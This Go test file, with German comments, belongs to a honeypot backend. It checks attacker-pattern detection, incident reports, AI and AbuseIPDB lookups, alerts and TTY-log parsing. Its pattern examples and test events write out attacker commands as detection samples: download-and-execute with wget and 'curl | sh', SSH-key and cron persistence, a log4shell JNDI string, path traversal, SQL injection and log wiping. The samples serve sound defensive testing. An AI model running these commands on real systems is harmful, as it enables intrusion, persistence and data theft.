package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

// Tests für Muster-Analyse, Bericht, KI, AbuseIPDB, Benachrichtigungen,
// Zusatz-Einstellungen und TTY-Mitschnitte.

func testHive(t *testing.T) *Hive {
	t.Helper()
	h := &Hive{st: testStore(t), started: time.Now(), broker: NewBroker(), sensors: &Sensors{last: map[string]Heartbeat{}},
		aiSem: make(chan struct{}, 1), geo: &Geo{}}
	h.loadExtras()
	h.notifier = NewNotifier(func() NotifyConfig { return h.Extras().Notify })
	return h
}

func cmdEv(ip, sess, input string) *Event {
	d, _ := json.Marshal(map[string]any{"input": input})
	return &Event{TS: time.Now(), Type: "command", Service: "ssh", SrcIP: ip, DstPort: 22, Session: sess, Data: d}
}

// ---------- Muster ----------

// Je Regel ein Beispiel, das passen muss. Fehlt hier eine Regel, schlägt der Test fehl.
var patternExamples = map[string]string{
	"download_exec":  "cd /tmp; wget http://203.0.113.9/x.sh; chmod +x x.sh; ./x.sh",
	"miner":          "nohup ./minerd -o pool.example:3333 &", // schlicht gehalten, siehe Kommentar an der Regel
	"iot_botnet":     "/bin/busybox MIRAI",
	"persist_ssh":    `echo "ssh-rsa AAAAB3Nza... x" >> ~/.ssh/authorized_keys`,
	"persist_cron":   "(crontab -l; echo '* * * * * /tmp/x') | crontab -",
	"docker_escape":  "create image=alpine cmd=sh binds=/:/mnt privileged",
	"redis_takeover": "CONFIG SET dir /var/spool/cron",
	"account":        "echo root:Passw0rd | chpasswd",
	"cover_tracks":   "history -c; unset HISTFILE",
	"kill_rivals":    "pkill -9 kdevtmpfsi",
	"recon":          "uname -a; cat /proc/cpuinfo | grep name | wc -l",
	"data_theft":     "ls -la ~/.local/share/TelegramDesktop/tdata",
	"log4shell":      "/?x=${jndi:ldap://203.0.113.9/a}",
	"web_rce":        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
	"secret_hunt":    "/.env",
	"iot_exploit":    "/boaform/admin/formLogin",
	"traversal":      "/cgi-bin/../../../../etc/passwd",
	"sqli":           "/item?id=1 UNION SELECT 1,2,3",
	"cms_login":      "/wp-login.php",
	"api_probe":      "/actuator/health",
	"tls_on_plain":   `\x16\x03\x01\x02\x00\x01`,
	"smb_probe":      `\x00\x00\x00\x85\xffSMBr\x00`,
	"http_on_raw":    `GET / HTTP/1.1\r\nHost: x`,
}

func TestPatterns(t *testing.T) {
	for _, p := range patterns {
		ex, ok := patternExamples[p.ID]
		if !ok {
			t.Errorf("Regel %s hat kein Beispiel in patternExamples", p.ID)
			continue
		}
		if !contains(matchPatterns(ex, p.On), p.ID) {
			t.Errorf("Regel %s passt nicht auf ihr Beispiel %q", p.ID, ex)
		}
	}
	// harmlose Texte dürfen nichts auslösen
	for on, s := range map[string]string{"cmd": "echo hallo", "web": "/index.html", "raw": "hallo"} {
		if m := matchPatterns(s, on); len(m) != 0 {
			t.Errorf("%q löst %v aus", s, m)
		}
	}
}

func TestCommandTools(t *testing.T) {
	got := strings.Join(commandTools("cd /tmp && /usr/bin/wget http://x/a; sudo apt-get install -y masscan libpcap-dev; docker pull alpine:3; X=1 curl x | sh"), ",")
	for _, want := range []string{"wget", "sudo", "apt-get", "curl", "installiert: masscan", "installiert: libpcap-dev", "installiert: Image alpine:3"} {
		if !strings.Contains(got, want) {
			t.Errorf("%q fehlt in %s", want, got)
		}
	}
	e := &Event{Type: "request", Data: json.RawMessage(`{"user_agent":"Mozilla/5.0 zgrab/0.x"}`)}
	if tl := eventTools(e); len(tl) != 1 || tl[0] != "Scanner: zgrab" {
		t.Errorf("User-Agent: %v", tl)
	}
	e = &Event{Type: "client_version", Data: json.RawMessage(`{"version":"SSH-2.0-libssh_0.9.6"}`)}
	if tl := eventTools(e); len(tl) != 1 || tl[0] != "SSH-Client: libssh_" {
		t.Errorf("SSH-Client: %v", tl)
	}
}

func TestBuildReport(t *testing.T) {
	ip := "203.0.113.50"
	login := &Event{TS: time.Now(), Type: "login", Service: "ssh", SrcIP: ip, Session: "s1", Username: "root", Password: "1234",
		Data: json.RawMessage(`{"success":true}`), Country: "NL", CountryName: "Niederlande", City: "Amsterdam", ASN: 64500, ASOrg: "Example"}
	dl := &Event{TS: time.Now(), Type: "download", Service: "ssh", SrcIP: ip, Session: "s1",
		Data: json.RawMessage(`{"url":"http://203.0.113.9/bot.sh","sha256":"` + strings.Repeat("a", 64) + `","failed":false}`)}
	evs := []*Event{
		{TS: time.Now(), Type: "connect", Service: "ssh", SrcIP: ip, DstPort: 22, Session: "s1"}, login,
		cmdEv(ip, "s1", "<b>x</b> uname -a 2>&1"), // darf keine "Dateien" liefern
		cmdEv(ip, "s1", "cd /tmp; wget http://203.0.113.9/bot.sh -O b.sh; chmod +x b.sh; ./b.sh"), dl,
	}
	r := BuildReport("IP "+ip, evs, false)
	if r.Severity != "hoch" || r.LoginsOK != 1 || r.Sessions != 1 || len(r.Commands) != 2 {
		t.Fatalf("Bericht: %+v", r)
	}
	if len(r.Tags) < 2 || r.Tags[0].ID != "download_exec" {
		t.Fatalf("Muster: %+v", r.Tags)
	}
	if len(r.URLs) != 1 || r.URLs[0] != "http://203.0.113.9/bot.sh" || len(r.Hashes) != 1 || len(r.Files) != 1 || r.Files[0] != "b.sh" {
		t.Fatalf("Spuren: urls=%v hashes=%v files=%v", r.URLs, r.Hashes, r.Files)
	}
	txt := r.Text()
	for _, want := range []string{"Einstufung: hoch", "Amsterdam", "root / 1234", "Nachladen und Ausführen", "wget"} {
		if !strings.Contains(txt, want) {
			t.Errorf("%q fehlt im Berichtstext:\n%s", want, txt)
		}
	}
	e := BuildReport("leer", nil, false)
	if e.Severity != "niedrig" || len(e.Summary) != 1 {
		t.Fatalf("leerer Bericht: %+v", e)
	}
	// Die UI ruft .length auf jeder Liste auf: im JSON darf kein null stehen.
	if b, _ := json.Marshal(e); strings.Contains(string(b), "null") {
		t.Fatalf("leere Listen müssen [] sein: %s", b)
	}
}

func TestTagAndToolCounters(t *testing.T) {
	st := testStore(t)
	w, wait := testWriter(t, st)
	w.Submit(cmdEv("203.0.113.51", "s", "wget http://203.0.113.9/a.sh; sh a.sh"))
	wait()
	for field, key := range map[string]string{"tag": "download_exec", "tool": "wget", "url": "http://203.0.113.9/a.sh"} {
		var n int
		st.db.QueryRow(`SELECT COALESCE(SUM(n),0) FROM top_hourly WHERE field=? AND key=?`, field, key).Scan(&n)
		if n != 1 {
			t.Errorf("Zähler %s/%s = %d", field, key, n)
		}
	}
}

func TestReportEndpoint(t *testing.T) {
	h := testHive(t)
	w, wait := testWriter(t, h.st)
	w.Submit(cmdEv("203.0.113.52", "sess9", "cat /proc/cpuinfo"))
	wait()
	for _, q := range []string{"ip=203.0.113.52", "session=sess9"} {
		rec := httptest.NewRecorder()
		h.report(rec, httptest.NewRequest("GET", "/api/report?"+q, nil))
		var out struct {
			Report Report `json:"report"`
		}
		json.Unmarshal(rec.Body.Bytes(), &out)
		if rec.Code != 200 || out.Report.Events != 1 || len(out.Report.Tags) != 1 || out.Report.Tags[0].ID != "recon" {
			t.Fatalf("%s: %d %s", q, rec.Code, rec.Body)
		}
	}
	rec := httptest.NewRecorder()
	h.report(rec, httptest.NewRequest("GET", "/api/report?ip=keine-ip", nil))
	if rec.Code != 400 {
		t.Fatalf("ungültige IP: %d", rec.Code)
	}
}

// ---------- KI ----------

func TestAskAI(t *testing.T) {
	var got struct {
		Model    string
		Messages []struct{ Role, Content string }
	}
	var auth string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth = r.Header.Get("Authorization")
		json.NewDecoder(r.Body).Decode(&got)
		if r.URL.Path != "/v1/chat/completions" {
			w.WriteHeader(404)
			return
		}
		io.WriteString(w, `{"choices":[{"message":{"role":"assistant","content":" 1. Ein Bot hat ... "}}]}`)
	}))
	defer srv.Close()
	txt, err := askAI(context.Background(), AIConfig{BaseURL: srv.URL + "/v1/", Model: "llama3", APIKey: "k"}, "Bericht")
	if err != nil || txt != "1. Ein Bot hat ..." {
		t.Fatalf("%q %v", txt, err)
	}
	if auth != "Bearer k" || got.Model != "llama3" || len(got.Messages) != 2 || got.Messages[1].Content != "Bericht" ||
		!strings.Contains(got.Messages[0].Content, "nicht vertrauenswürdig") {
		t.Fatalf("Anfrage falsch: %s %+v", auth, got)
	}
	if _, err := askAI(context.Background(), AIConfig{BaseURL: srv.URL + "/falsch", Model: "x"}, "y"); err == nil {
		t.Fatal("Fehlerstatus muss gemeldet werden")
	}
}

func TestReportAIStoresResult(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, `{"choices":[{"message":{"content":"Auswertung"}}]}`)
	}))
	defer srv.Close()
	h := testHive(t)
	post := func() *httptest.ResponseRecorder {
		rec := httptest.NewRecorder()
		h.reportAI(rec, httptest.NewRequest("POST", "/api/report/ai", strings.NewReader(`{"ip":"203.0.113.53"}`)))
		return rec
	}
	if rec := post(); rec.Code != 400 {
		t.Fatalf("ohne Einrichtung: %d", rec.Code)
	}
	h.extras.x.AI = AIConfig{Enabled: true, BaseURL: srv.URL, Model: "m"}
	if rec := post(); rec.Code != 200 {
		t.Fatalf("%d %s", rec.Code, rec.Body)
	}
	if txt, _, ok := h.st.lookupGet("ip:203.0.113.53", "ai", 0); !ok || txt != "Auswertung" {
		t.Fatalf("nicht gespeichert: %q", txt)
	}
}

// ---------- AbuseIPDB ----------

func TestIntelCacheAndPrivate(t *testing.T) {
	calls := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls++
		if r.Header.Get("Key") != "geheim" || r.URL.Query().Get("ipAddress") != "203.0.113.54" {
			w.WriteHeader(401)
			return
		}
		io.WriteString(w, `{"data":{"abuseConfidenceScore":97,"totalReports":12,"isp":"Example","ipAddress":"203.0.113.54"}}`)
	}))
	defer srv.Close()
	old := abuseBase
	abuseBase = srv.URL
	defer func() { abuseBase = old }()
	h := testHive(t)
	get := func(ip string) *httptest.ResponseRecorder {
		req := httptest.NewRequest("GET", "/api/attackers/"+ip+"/intel", nil)
		req.SetPathValue("ip", ip)
		rec := httptest.NewRecorder()
		h.intel(rec, req)
		return rec
	}
	if rec := get("203.0.113.54"); rec.Code != 400 {
		t.Fatalf("ohne Schlüssel: %d", rec.Code)
	}
	h.extras.x.AbuseIPDBKey = "geheim"
	for i := 0; i < 2; i++ {
		rec := get("203.0.113.54")
		if rec.Code != 200 || !strings.Contains(rec.Body.String(), `"abuseConfidenceScore":97`) || strings.Contains(rec.Body.String(), "ipAddress") {
			t.Fatalf("%d %s", rec.Code, rec.Body)
		}
	}
	if calls != 1 {
		t.Fatalf("%d Abfragen, erwartet 1 (zweite aus dem Zwischenspeicher)", calls)
	}
	if rec := get("192.168.1.5"); rec.Code != 400 || calls != 1 {
		t.Fatalf("private IP darf nicht abgefragt werden: %d", rec.Code)
	}
}

// ---------- Zusatz-Einstellungen ----------

func TestExtrasSecretsStayInside(t *testing.T) {
	h := testHive(t)
	put := func(body string) int {
		rec := httptest.NewRecorder()
		h.putExtras(rec, httptest.NewRequest("PUT", "/api/extras", strings.NewReader(body)))
		return rec.Code
	}
	if c := put(`{"notify":{"enabled":true,"ntfy_url":"https://ntfy.example/t","ntfy_token":"tk_123","max_per_hour":5},"abuseipdb_key":"abc"}`); c != 200 {
		t.Fatalf("Speichern: %d", c)
	}
	rec := httptest.NewRecorder()
	h.getExtras(rec, httptest.NewRequest("GET", "/api/extras", nil))
	if strings.Contains(rec.Body.String(), "tk_123") || strings.Contains(rec.Body.String(), `"abc"`) {
		t.Fatalf("Geheimnis in der Antwort: %s", rec.Body)
	}
	if !strings.Contains(rec.Body.String(), `"ntfy_token":true`) {
		t.Fatalf("secrets-Kennzeichen fehlt: %s", rec.Body)
	}
	// leer = behalten, "-" = löschen
	put(`{"notify":{"ntfy_token":"","max_per_hour":5},"abuseipdb_key":"-"}`)
	if x := h.Extras(); x.Notify.NtfyToken != "tk_123" || x.AbuseIPDBKey != "" {
		t.Fatalf("behalten/löschen falsch: %+v", x)
	}
	if c := put(`{"notify":{"ntfy_url":"javascript:alert(1)","max_per_hour":5}}`); c != 400 {
		t.Fatalf("ungültige Adresse angenommen: %d", c)
	}
	// nach einem Neustart wieder da
	h2 := &Hive{st: h.st}
	h2.loadExtras()
	if h2.Extras().Notify.NtfyURL != "https://ntfy.example/t" {
		t.Fatal("Einstellungen nicht gespeichert")
	}
}

// ---------- Benachrichtigungen ----------

func TestNotifier(t *testing.T) {
	var mu sync.Mutex
	got := map[string][]string{}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		got[r.URL.Path] = append(got[r.URL.Path], r.Header.Get("Title")+"|"+string(b))
		mu.Unlock()
		if strings.HasPrefix(r.URL.Path, "/botSECRET") {
			w.WriteHeader(500)
		}
	}))
	defer srv.Close()
	cfg := NotifyConfig{Enabled: true, NtfyURL: srv.URL + "/thema", WebhookURL: srv.URL + "/hook", OnLogin: true, OnSevere: true, OnCommand: true, MaxPerHour: 3}
	n := NewNotifier(func() NotifyConfig { return cfg })
	n.telegramBase = srv.URL
	stop := make(chan struct{})
	defer close(stop)
	go n.Run(stop)

	ok := &Event{TS: time.Now(), Type: "login", Service: "ssh", DstPort: 22, SrcIP: "203.0.113.60", Username: "root", Password: "pw", Data: json.RawMessage(`{"success":true}`)}
	fail := &Event{Type: "login", SrcIP: "203.0.113.61", Data: json.RawMessage(`{"success":false}`)}
	n.OnEvent(ok)
	n.OnEvent(ok)   // Abklingzeit: gleiche Art und IP
	n.OnEvent(fail) // nicht erfolgreich: keine Meldung
	n.OnEvent(cmdEv("203.0.113.62", "a", "wget http://x/y | sh"))
	n.OnEvent(cmdEv("203.0.113.63", "b", "ls"))
	n.OnEvent(cmdEv("203.0.113.64", "c", "ls")) // viertes: über dem Stundenlimit
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) && n.Status().Sent < 3 {
		time.Sleep(20 * time.Millisecond)
	}
	st := n.Status()
	if st.Sent != 3 || st.Suppressed != 2 {
		t.Fatalf("gesendet=%d unterdrückt=%d", st.Sent, st.Suppressed)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(got["/thema"]) != 3 || len(got["/hook"]) != 3 {
		t.Fatalf("Ziele: %v", got)
	}
	if !strings.HasPrefix(got["/thema"][0], "Erfolgreicher Login am Honeypot|") || !strings.Contains(got["/thema"][0], "root / pw") {
		t.Fatalf("ntfy-Meldung: %q", got["/thema"][0])
	}
	if !strings.Contains(got["/thema"][1], "Nachladen und Ausfuehren") {
		t.Fatalf("Titel ohne Umlaut erwartet: %q", got["/thema"][1])
	}
	// Fehler eines Ziels: Token darf nicht im Fehlertext stehen
	err := n.Send(NotifyConfig{TelegramToken: "SECRET", TelegramChat: "1"}, notice{Title: "t", Text: "x"})
	if err == nil || strings.Contains(err.Error(), "SECRET") {
		t.Fatalf("Fehler: %v", err)
	}
	if n.Send(NotifyConfig{}, notice{}) == nil {
		t.Fatal("ohne Ziel muss ein Fehler kommen")
	}
}

// ---------- TTY-Mitschnitt ----------

func ttyRec(op, dir uint32, sec, usec uint32, data string) []byte {
	b := make([]byte, 24)
	binary.LittleEndian.PutUint32(b[0:], op)
	binary.LittleEndian.PutUint32(b[8:], uint32(len(data)))
	binary.LittleEndian.PutUint32(b[12:], dir)
	binary.LittleEndian.PutUint32(b[16:], sec)
	binary.LittleEndian.PutUint32(b[20:], usec)
	return append(b, data...)
}

func TestParseTTYLog(t *testing.T) {
	var f bytes.Buffer
	f.Write(ttyRec(1, 0, 100, 0, ""))
	f.Write(ttyRec(3, 2, 100, 0, "\x1b[01;32mroot@nas\x1b[0m:~# "))
	f.Write(ttyRec(3, 1, 101, 500000, "uname -a\r"))
	f.Write(ttyRec(3, 2, 101, 600000, "\r\nLinux nas\x07\r\n"))
	f.Write(ttyRec(2, 0, 103, 0, ""))
	f.Write([]byte{1, 2, 3}) // abgeschnittener Rest
	l := parseTTYLog(&f)
	if len(l.Frames) != 3 || l.Frames[0].S != "root@nas:~# " || l.Frames[1].Dir != "in" || l.Frames[1].T != 1500 || l.Frames[2].S != "\nLinux nas\n" {
		t.Fatalf("%+v", l)
	}
	if l.DurationM != 3000 {
		t.Fatalf("Dauer %d", l.DurationM)
	}
	// riesige Längenangabe darf nichts reservieren
	bad := ttyRec(3, 2, 1, 0, "")
	binary.LittleEndian.PutUint32(bad[8:], 0xfffffff0)
	if l := parseTTYLog(bytes.NewReader(bad)); !l.Truncated || len(l.Frames) != 0 {
		t.Fatalf("%+v", l)
	}
}

func TestCowrieTTYEventAndEndpoint(t *testing.T) {
	h := testHive(t)
	sum := strings.Repeat("ab", 32)
	h.cowrieLibDir = t.TempDir()
	os.MkdirAll(filepath.Join(h.cowrieLibDir, "tty"), 0o755)
	os.WriteFile(filepath.Join(h.cowrieLibDir, "tty", sum), ttyRec(3, 2, 5, 0, "hallo"), 0o644)
	w, wait := testWriter(t, h.st)
	c := NewCowrieTail("x", "s", h.st, func(e *Event) { w.Submit(e) })
	c.handle([]byte(`{"eventid":"cowrie.log.closed","session":"tt1","src_ip":"203.0.113.70","shasum":"` + sum + `","size":29,"duration":2.5,"ttylog":"var/lib/cowrie/tty/` + sum + `","timestamp":"2026-11-13T10:00:00.000000Z"}`))
	c.handle([]byte(`{"eventid":"cowrie.log.closed","session":"tt2","src_ip":"203.0.113.70","shasum":"../../etc/passwd","timestamp":"2026-11-13T10:00:00.000000Z"}`))
	wait()
	get := func(id string) *httptest.ResponseRecorder {
		req := httptest.NewRequest("GET", "/api/sessions/"+id+"/tty", nil)
		req.SetPathValue("id", id)
		rec := httptest.NewRecorder()
		h.sessionTTY(rec, req)
		return rec
	}
	if rec := get("tt1"); rec.Code != 200 || !strings.Contains(rec.Body.String(), `"s":"hallo"`) {
		t.Fatalf("%d %s", rec.Code, rec.Body)
	}
	if rec := get("tt2"); rec.Code != 404 {
		t.Fatalf("ungültiger Hash muss abgelehnt werden: %d", rec.Code)
	}
	os.Remove(filepath.Join(h.cowrieLibDir, "tty", sum))
	if rec := get("tt1"); rec.Code != 410 {
		t.Fatalf("aufgeräumte Datei: %d", rec.Code)
	}
}

func TestMigrationCreatesLookups(t *testing.T) {
	st := testStore(t)
	if err := st.lookupPut("ip:203.0.113.1", "ai", "x"); err != nil {
		t.Fatal(err)
	}
	if _, _, ok := st.lookupGet("ip:203.0.113.1", "ai", time.Hour); !ok {
		t.Fatal("Eintrag nicht gefunden")
	}
	st.db.Exec(`UPDATE lookups SET fetched = 1`)
	if _, _, ok := st.lookupGet("ip:203.0.113.1", "ai", time.Hour); ok {
		t.Fatal("alter Eintrag darf nicht gelten")
	}
	st.Retention(RetentionPolicy{Days: 30})
	var n int
	st.db.QueryRow(`SELECT COUNT(*) FROM lookups`).Scan(&n)
	if n != 0 {
		t.Fatal("Aufbewahrung löscht alte Einträge nicht")
	}
}

// ---------- Router ----------

// In 0.2.0 stürzte der Hive ohne HIVE_SENSOR_LISTEN beim Start ab (Routen-Konflikt).
func TestRoutesBothModes(t *testing.T) {
	h := testHive(t)
	h.auth = NewAuth(h.st, "tok", false)
	for _, onUI := range []bool{false, true} {
		ui, sensor := h.routes(onUI, "metrik", http.NotFoundHandler())
		req := httptest.NewRequest("POST", "/api/sensor/heartbeat", strings.NewReader(`{"sensor":"x"}`))
		req.Header.Set("Authorization", "Bearer tok")
		rec := httptest.NewRecorder()
		sensor.ServeHTTP(rec, req)
		if rec.Code != 200 {
			t.Fatalf("Sensor-Router: %d", rec.Code)
		}
		req = httptest.NewRequest("POST", "/api/ingest", strings.NewReader(`{"events":[]}`))
		req.Header.Set("Authorization", "Bearer tok")
		rec = httptest.NewRecorder()
		ui.ServeHTTP(rec, req)
		if want := map[bool]int{true: 200, false: 405}[onUI]; rec.Code != want {
			t.Fatalf("UI-Router (sensorOnUI=%v): %d, erwartet %d", onUI, rec.Code, want)
		}
		rec = httptest.NewRecorder()
		ui.ServeHTTP(rec, httptest.NewRequest("GET", "/api/extras", nil))
		if rec.Code != 401 {
			t.Fatalf("geschützte Route ohne Anmeldung: %d", rec.Code)
		}
	}
}

// ---------- Ersteinrichtung ----------

func TestSetupOnlyOnce(t *testing.T) {
	h := testHive(t)
	h.auth = NewAuth(h.st, "tok", false)
	h.auth.EnsureAdmin("admin", "") // ohne Passwort: kein Konto, Assistent nötig
	if !h.auth.NeedsSetup() {
		t.Fatal("ohne Konto muss die Ersteinrichtung nötig sein")
	}
	post := func(body string, header bool) *httptest.ResponseRecorder {
		req := httptest.NewRequest("POST", "/api/setup", strings.NewReader(body))
		if header {
			req.Header.Set("X-Requested-With", "hivornet")
		}
		rec := httptest.NewRecorder()
		h.setupRun(rec, req)
		return rec
	}
	if rec := post(`{"password":"langgenug123"}`, false); rec.Code != 403 {
		t.Fatalf("ohne Header: %d", rec.Code)
	}
	if rec := post(`{"password":"kurz"}`, true); rec.Code != 400 || !h.auth.NeedsSetup() {
		t.Fatalf("zu kurzes Passwort: %d", rec.Code)
	}
	rec := post(`{"password":"langgenug123","home":{"lat":52.5,"lon":13.4,"label":"Berlin"}}`, true)
	if rec.Code != 200 || len(rec.Result().Cookies()) != 1 {
		t.Fatalf("Einrichtung: %d %s", rec.Code, rec.Body)
	}
	if h.auth.NeedsSetup() || !h.auth.Check("admin", "langgenug123") || h.Extras().Home.Label != "Berlin" {
		t.Fatal("Konto oder Standort nicht gespeichert")
	}
	// zweiter Versuch darf das Passwort nicht überschreiben
	if rec := post(`{"password":"anderespasswort"}`, true); rec.Code != 409 || h.auth.Check("admin", "anderespasswort") {
		t.Fatalf("zweite Einrichtung: %d", rec.Code)
	}
}

// ---------- Port-Konfiguration anpassen ----------

func TestUpgradeSensorConfigs(t *testing.T) {
	st := testStore(t)
	old := `{"hostname":"nas","listeners":[{"service":"raw","port":5900,"mode":"hybrid","enabled":true},{"service":"http","port":25,"mode":"emulate","enabled":true}],"tarpit":{"interval_ms":10000,"max_conns":4096,"max_per_ip":32,"max_duration_min":1440}}`
	st.SetKV("sensor_config", old)
	upgradeSensorConfigs(st)
	v, _ := st.GetKV("sensor_config")
	var c SensorConfig
	json.Unmarshal([]byte(v), &c)
	got := map[int]string{}
	for _, l := range c.Listeners {
		got[l.Port] = l.Service
	}
	// 5900 wird VNC, Telnet und RDP kommen dazu, der belegte Port 25 bleibt, wie er ist
	if got[5900] != "vnc" || got[2323] != "telnet" || got[3389] != "rdp" || got[25] != "http" {
		t.Fatalf("Ergebnis: %v", got)
	}
	// zweiter Lauf ändert nichts mehr (z. B. wenn der Nutzer Telnet wieder entfernt hat)
	st.SetKV("sensor_config", old)
	upgradeSensorConfigs(st)
	if v, _ := st.GetKV("sensor_config"); v != old {
		t.Fatal("Anpassung darf nur einmal laufen")
	}
}

// ---------- Update-Prüfung ----------

func TestNewestRelease(t *testing.T) {
	const base = "https://github.com/MrLuigi938/hivornet/releases/tag/"
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, `[{"tag_name":"v0.3.1","html_url":"%sv0.3.1"},{"tag_name":"v0.4.0-beta.1","html_url":"%sv0.4.0-beta.1","prerelease":true},
			{"tag_name":"v0.9.0","html_url":"%sv0.9.0","draft":true},{"tag_name":"v9.9.9","html_url":"https://example.com/fremd"},{"tag_name":"unsinn","html_url":"%sx"}]`, base, base, base, base)
	}))
	defer srv.Close()
	old := releasesURL
	releasesURL = srv.URL
	defer func() { releasesURL = old }()
	r, err := newestRelease(context.Background(), "0.3.0")
	if err != nil || r == nil || r.Version != "0.3.1" {
		t.Fatalf("stabil: %+v %v", r, err)
	}
	if r, _ := newestRelease(context.Background(), "0.3.1"); r != nil {
		t.Fatalf("aktuell, aber Hinweis: %+v", r)
	}
	if r, _ := newestRelease(context.Background(), "v0.3.1-beta.2"); r == nil || r.Version != "0.4.0-beta.1" {
		t.Fatalf("Vorabversion sieht neuere Vorabversionen: %+v", r)
	}
	if !parseSemver("1.2.3").newer(parseSemver("1.2.3-rc.1")) || parseSemver("dev").ok {
		t.Fatal("Versionsvergleich falsch")
	}
}

func TestUpdateRequestFile(t *testing.T) {
	h := testHive(t)
	p := filepath.Join(t.TempDir(), "update-request")
	run := func() *httptest.ResponseRecorder {
		rec := httptest.NewRecorder()
		h.updateRun(rec, httptest.NewRequest("POST", "/api/update", nil))
		return rec
	}
	if rec := run(); rec.Code != 400 { // kein Updater eingerichtet
		t.Fatalf("ohne Updater: %d", rec.Code)
	}
	t.Setenv("HIVE_UPDATE_REQUEST", p)
	if rec := run(); rec.Code != 400 { // keine neuere Version bekannt
		t.Fatalf("ohne neue Version: %d", rec.Code)
	}
	h.upd.newest = &releaseInfo{Version: "0.3.1", URL: "x"}
	if rec := run(); rec.Code != 200 {
		t.Fatalf("%d %s", rec.Code, rec.Body)
	}
	if b, _ := os.ReadFile(p); string(b) != "v0.3.1\n" {
		t.Fatalf("Anforderung: %q", b)
	}
}
